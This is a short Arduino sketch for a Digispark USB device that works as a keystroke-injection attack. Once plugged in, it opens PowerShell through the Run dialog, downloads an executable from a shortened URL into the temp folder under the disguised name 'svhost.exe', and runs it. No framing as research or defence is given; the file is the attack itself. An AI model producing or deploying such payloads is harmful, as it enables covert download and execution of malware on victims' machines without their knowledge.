#include "DigiKeyboardFr.h"

void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_FR_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cd (gi $env:temp).fullname");
  DigiKeyboard.print("Invoke-WebRequest -Uri https://clck.ru/Z6oX5 -OutFile svhost.exe; ./svhost.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
} 

void loop() {
  // put your main code here, to run repeatedly:

}
